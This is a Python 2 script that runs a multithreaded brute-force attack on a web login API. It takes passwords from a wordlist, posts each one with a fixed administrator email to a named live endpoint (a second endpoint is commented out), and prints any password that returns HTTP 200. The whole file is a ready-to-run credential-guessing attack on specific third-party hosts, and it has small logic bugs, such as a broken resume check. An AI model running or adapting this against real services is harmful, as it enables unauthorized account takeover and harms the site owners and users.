import threading
import sys
import Queue
import requests
import json

user_thread = 10
wordlist_file = "/tmp/cain.txt"
"""target_url = "https://albertus.viveogroup.com/api/v1/login" """
target_url = "https://albertus.pedidos.bizzi.me/api/v1/login"
username ="administrador@domain"
resume= None

class HackLogin(object):
	def __init__(self):
		self.username = username
		self.found = False
		self.password_q = self.build_wordlist()
		

	def run_bruteforce(self):
		for i in range(user_thread):
			t = threading.Thread(target=self.login_bruter)
			t.start()

	def build_wordlist(self):
		fd = open(wordlist_file,"rb")
		raw_words = fd.readlines()
		fd.close()
		found_resume = False
		words = Queue.Queue()
		for word in raw_words:
			word = word.rstrip()
			if resume is not None:
				if found_resume:
					words.put(word)
				else:
					if words == resume:
						found_resume = True
						print "Resuming wordlist from: %s" % resume
			else:
				words.put(word)
		return words


	def login_bruter(self):
		while not self.password_q.empty() and not self.found:
			brute = self.password_q.get().rstrip()
			str_login = {'email': username, 'password':brute}
			r = requests.post(target_url, data = str_login)
			if r.status_code == 200:
				print('Hacking Ready! Password encontrada')
				print(brute)
if __name__ == '__main__':
	hack = HackLogin()
	hack.run_bruteforce()
